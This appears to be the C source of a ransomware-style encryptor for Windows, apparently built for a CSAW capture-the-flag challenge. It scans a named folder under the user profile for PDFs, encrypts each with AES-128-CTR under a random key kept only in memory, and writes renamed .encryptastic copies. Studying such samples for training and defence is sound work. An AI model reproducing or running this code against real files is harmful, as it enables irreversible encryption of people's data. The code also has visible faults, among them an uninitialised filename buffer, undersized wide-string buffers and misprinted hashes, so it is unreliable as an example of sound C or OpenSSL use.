// Credit to Amit Kulkarni for OpenSSL EVP file encryption example
// https://github.com/kulkarniamit/openssl-evp-demo/blob/master/openssl_evp_demo.c

#include <stdio.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <string.h>
#include <windows.h>
#include <winbase.h>
#include <openssl/rand.h>
#include <Lmcons.h>
#include <shlwapi.h>

#define ERR_EVP_CIPHER_INIT -1
#define ERR_EVP_CIPHER_UPDATE -2
#define ERR_EVP_CIPHER_FINAL -3
#define ERR_EVP_CTX_NEW -4

#define AES_KEY_SIZE 16
#define IV_SIZE 16
#define BUFSIZE 1024 //increase this?
//#define HASH_BLOCK_SIZE 64


struct materials {
    unsigned char* key;
    unsigned char* iv;
    const EVP_CIPHER *cipher_type;
};

typedef struct materials Struct;

void cleanup(Struct *mats, FILE *infile, FILE *outfile, int rc){
    free(mats);
    fclose(infile);
    fclose(outfile);
    exit(rc);
}




// Generate Key
Struct Gin(){

    Struct *mats = (Struct *)malloc(sizeof(Struct));
    mats->key = malloc(AES_KEY_SIZE);
    mats->iv = malloc(IV_SIZE);

    if (!mats) {
        /* Unable to allocate memory on heap*/
        fprintf(stderr, "ERROR: malloc error: %s\n", strerror(errno));
        exit(1);
    }

    if (!RAND_bytes(mats->key, AES_KEY_SIZE) || !RAND_bytes(mats->iv, AES_KEY_SIZE)) {
        /* OpenSSL reports a failure, act accordingly */
        fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
        exit(1);
    };

    mats->cipher_type = EVP_aes_128_ctr();

    return *mats;

};


// AES-CTR
int inkripshun(wchar_t* basePath, wchar_t* infilename, Struct *mats){

    printf("In inkripshun");
    FILE *infile;
    FILE *outfile;

    infile = _wfopen(infilename, L"rb");
         if (!infile) {
        /* Unable to open file for reading */
        fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
        return errno;
    };

    // Hash contents

    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);

    int num_bytes_read1 = 0;
    char* hashbuf = malloc(BUFSIZE);

    while(1){
    
    // Read in data in blocks until EOF. Update the ciphering with each read.
    num_bytes_read1 = fread(hashbuf, 1, BUFSIZE, infile);
    if (ferror(infile)){
        fprintf(stderr, "ERROR: fread error: %s\n", strerror(errno));
        cleanup(mats, infile, outfile, errno);
    }
    if(!SHA256_Update(&sha256, hashbuf, num_bytes_read1)){
        fprintf(stderr, "ERROR: SHA256_Update failed. OpenSSL error: %s\n", 
                ERR_error_string(ERR_get_error(), NULL));
        cleanup(mats, infile, outfile, errno);
    }
    if (num_bytes_read1 < BUFSIZE) {
        /* Reached End of file */
        break;
    }}
    SHA256_Final(hash, &sha256);
    printf("%02x", hash);
    
    // convert char* to LPWSTR                            
    wchar_t* wide_hash = malloc(64);
    MultiByteToWideChar(CP_ACP, 0, hash, -1, wide_hash, 33);

    rewind(infile);    
    

    wchar_t* outfileName = malloc(wcslen(basePath) + SHA256_DIGEST_LENGTH + 17);
    //char outfileName[strlen(infilename) + 13];
    //strcpy(outfileName,infilename);
    wprintf(outfileName);
    wcsncat(outfileName, basePath, wcslen(basePath));
    wprintf(outfileName);
    wcscat(outfileName, wide_hash);
    wprintf(outfileName);
    wcscat(outfileName,L".pdf.encryptastic");
    wprintf(outfileName);
    

    outfile = _wfopen(outfileName, L"wb");
    if (!outfile) {
        /* Unable to open file for writing */
        fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
        return errno;
    }

    // Encrypt

    /* Allow enough space in output buffer for additional block */
    int cipher_block_size = EVP_CIPHER_block_size(mats->cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];

    int num_bytes_read, out_len;
    EVP_CIPHER_CTX *ctx;

    ctx = EVP_CIPHER_CTX_new();
    if(ctx == NULL){
        fprintf(stderr, "ERROR: EVP_CIPHER_CTX_new failed. OpenSSL error: %s\n", 
                ERR_error_string(ERR_get_error(), NULL));
        cleanup(mats, infile, outfile, ERR_EVP_CTX_NEW);
    };

    /* Don't set key or IV right away; we want to check lengths */
    if(!EVP_CipherInit_ex(ctx, mats->cipher_type, NULL, NULL, NULL, 1)){
        fprintf(stderr, "ERROR: EVP_CipherInit_ex failed. OpenSSL error: %s\n", 
                ERR_error_string(ERR_get_error(), NULL));
        cleanup(mats, infile, outfile, ERR_EVP_CIPHER_INIT);
    };

    OPENSSL_assert(EVP_CIPHER_CTX_key_length(ctx) == AES_KEY_SIZE);
    OPENSSL_assert(EVP_CIPHER_CTX_iv_length(ctx) == AES_KEY_SIZE);

    /* Now we can set key and IV */
    if(!EVP_CipherInit_ex(ctx, NULL, NULL, mats->key, mats->iv, 1)){
        fprintf(stderr, "ERROR: EVP_CipherInit_ex failed. OpenSSL error: %s\n", 
        ERR_error_string(ERR_get_error(), NULL));
        EVP_CIPHER_CTX_cleanup(ctx);
        cleanup(mats, infile, outfile, ERR_EVP_CIPHER_INIT);
    };


    while(1){
        // Read in data in blocks until EOF. Update the cipher with each read.
        num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, infile);
        if (ferror(infile)){
            fprintf(stderr, "ERROR: fread error: %s\n", strerror(errno));
            EVP_CIPHER_CTX_cleanup(ctx);
            cleanup(mats, infile, outfile, errno);
        }
        if(!EVP_CipherUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
            fprintf(stderr, "ERROR: EVP_CipherUpdate failed. OpenSSL error: %s\n", 
                    ERR_error_string(ERR_get_error(), NULL));
            EVP_CIPHER_CTX_cleanup(ctx);
            cleanup(mats, infile, outfile, ERR_EVP_CIPHER_UPDATE);
        }
        fwrite(out_buf, sizeof(unsigned char), out_len, outfile);
        if (ferror(outfile)) {
            fprintf(stderr, "ERROR: fwrite error: %s\n", strerror(errno));
            EVP_CIPHER_CTX_cleanup(ctx);
            cleanup(mats, infile, outfile, errno);
        }
        if (num_bytes_read < BUFSIZE) {
            /* Reached End of file */
            break;
        };
    } 
    /* Now cipher the final block and write it out to file */
    if(!EVP_CipherFinal_ex(ctx, out_buf, &out_len)){
        fprintf(stderr, "ERROR: EVP_CipherFinal_ex failed. OpenSSL error: %s\n", 
                ERR_error_string(ERR_get_error(), NULL));
        EVP_CIPHER_CTX_cleanup(ctx);
        cleanup(mats, infile, outfile, ERR_EVP_CIPHER_FINAL);
    }
    fwrite(out_buf, sizeof(unsigned char), out_len, outfile);
    if (ferror(outfile)) {
        fprintf(stderr, "ERROR: fwrite error: %s\n", strerror(errno));
        EVP_CIPHER_CTX_cleanup(ctx);
        cleanup(mats, infile, outfile, errno);
    };
    EVP_CIPHER_CTX_cleanup(ctx);

    // Delete original file?  
    free(outfileName);
    return 0;
};


// Find directory function
// Don't forget to catch "Directory Not Found"!
const char* chekDirectoree(){

    // Get user's logon name
    char userName[UNLEN+1];
    //char targitDirectoree[MAX_PATH];
    //targitDirectoree 
    char * targitDirectoree = strcat(getenv("USERPROFILE"),"\\SecretCSAWDocuments\\");

    //printf("MAX_PATH = %d\n", MAX_PATH);
    LPDWORD pcbBuffer;
    DWORD length = UNLEN + 1;
    pcbBuffer = &length;
    WINBOOL gotUserName = GetUserName(userName, pcbBuffer);
    printf("User name: %s\n", userName);
    printf("Home directory is %s\n", getenv("USERPROFILE"));
    printf("Checking Directory %s\n", targitDirectoree);
};

// Main
int main(){

    printf("Hello world! This is the encryptor.\n");
    FILE *nextFile;

    Struct key_iv = Gin();

    // Check CWD name
    wchar_t *directoryPath = (wchar_t *) malloc(MAX_PATH*2);
    wcsncpy(directoryPath, _wgetenv(L"USERPROFILE"), (MAX_PATH - 22));
    wcsncat(directoryPath, L"\\SecretCSAWDocuments\\", 22);  
    
    wchar_t *directoryDupe = (wchar_t *) malloc(MAX_PATH*2);
    wcsncpy(directoryDupe, directoryPath, MAX_PATH);
    
    wchar_t *basePath = (wchar_t *) malloc(MAX_PATH*2);
    wcsncpy(basePath, directoryPath, MAX_PATH);

    wchar_t *fileToEncryptPath = malloc(MAX_PATH);


    if (PathFileExistsW(directoryPath)) {
        // Loop through files in directory
        WIN32_FIND_DATAW data;
        wcsncat(directoryPath, L"*.pdf", 6);
        HANDLE hFind = FindFirstFileW(directoryPath, &data);
        if( hFind != INVALID_HANDLE_VALUE){
            do{
                printf("%s\n",data.cFileName);
                wcsncpy(fileToEncryptPath, directoryDupe, MAX_PATH);
                wcsncat(fileToEncryptPath, data.cFileName, (wcslen(data.cFileName)));
                inkripshun(basePath,fileToEncryptPath, &key_iv);
                memset(fileToEncryptPath, 0, MAX_PATH);
            } while (FindNextFileW(hFind, &data));
            FindClose(hFind);
        };

    } else {
        printf("Did not find the CSAW secret directory.\n");
    }

    free(directoryPath);
    free(basePath);
    free(directoryDupe);
}